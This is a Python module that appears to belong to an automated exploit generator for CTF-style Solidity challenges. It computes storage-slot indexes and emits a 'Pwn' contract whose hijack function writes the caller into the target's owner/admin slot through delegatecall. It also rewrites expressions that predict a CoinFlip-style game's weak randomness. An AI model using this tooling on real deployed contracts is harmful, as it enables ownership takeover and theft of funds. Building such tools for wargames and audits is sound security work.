"""Storage layout + mixed-entropy rewriting.

owner_not_slot0: count preceding 1-slot state vars so a delegatecall Pwn
writes the *actual* owner/admin slot, not slot 0.

mixed_entropy: leftover identifiers in a CoinFlip clone (nonce, seed)
become public getters on the target, not a dead path.
"""
from __future__ import annotations

import re
from typing import List, Optional, Tuple

_SLOT_DECL = re.compile(
    r"(mapping\s*\([^)]*\)[^ ]*|address|uint\d*|int\d*|bool|bytes\d*|string|bytes)\s+"
    r"(?:public\s+|private\s+|internal\s+)?(constant\s+|immutable\s+)?(\w+)",
)

ENTROPY_OK = {
    "block", "blockhash", "uint256", "uint", "keccak256", "abi", "bytes32",
    "true", "false", "prevrandao", "timestamp", "number", "difficulty",
    "encodePacked", "encode", "uint160", "address", "this", "msg", "sender",
    "value", "gasleft", "now",
}


def slot_index(src: str, var: str) -> Optional[int]:
    """1-slot-per-var index. constant/immutable skipped. Packing ignored."""
    try:
        from .scan import _contract_bodies
        bodies = _contract_bodies(src or "")
        blobs = list(bodies.values()) or [src or ""]
    except Exception:
        blobs = [src or ""]
    for tb in blobs:
        idx = _slot_index_body(tb, var)
        if idx is not None:
            return idx
    return None


def _slot_index_body(tb: str, var: str) -> Optional[int]:
    tb = (tb or "").strip()
    if tb.startswith("{"):
        tb = tb[1:]
    idx = 0
    for line in tb.split(";"):
        line = line.strip()
        if line.startswith("function") or line.startswith("constructor") or line.startswith("modifier"):
            break
        md = _SLOT_DECL.search(line)
        if not md:
            continue
        if md.group(2):
            continue
        if md.group(3) == var:
            return idx
        idx += 1
    return None


def privileged_slot(src: str) -> int:
    for name in ("owner", "admin", "ward", "governor", "authority"):
        i = slot_index(src, name)
        if i is not None:
            return i
    return 0


def pwn_hijack(slot: int) -> str:
    """Pwn contract body: pad to `slot`, then write msg.sender there."""
    if slot <= 0:
        return (
            "    address public slot0;\n"
            "    function hijack() external { slot0 = msg.sender; }\n"
        )
    pads = "".join(f"    uint256 pad{i};\n" for i in range(slot))
    return (
        pads
        + f"    address public slot{slot};\n"
        + f"    function hijack() external {{ slot{slot} = msg.sender; }}\n"
    )


def rewrite_mixed(expr: str, src: str, obj: str = "t") -> Tuple[str, List[str]]:
    """Replace leftover ids with `{obj}.id()` when a public getter exists."""
    getters: List[str] = []
    leftover = [
        i for i in re.findall(r"[A-Za-z_]\w*", expr or "")
        if i not in ENTROPY_OK
    ]
    out = expr or ""
    for idn in leftover:
        public = re.search(
            rf"(?:uint\d*|bytes32|bool|address)\s+(?:public\s+|private\s+|internal\s+)?(?:constant\s+|immutable\s+)?{idn}\b",
            src or "",
        )
        fn = re.search(rf"function\s+{idn}\s*\(", src or "")
        if not (public or fn):
            continue
        out = re.sub(rf"\b{idn}\b", f"{obj}.{idn}()", out)
        if idn not in getters:
            getters.append(idn)
    return out, getters


def leftover_ids(expr: str) -> List[str]:
    return [
        i for i in re.findall(r"[A-Za-z_]\w*", expr or "")
        if i not in ENTROPY_OK
    ]
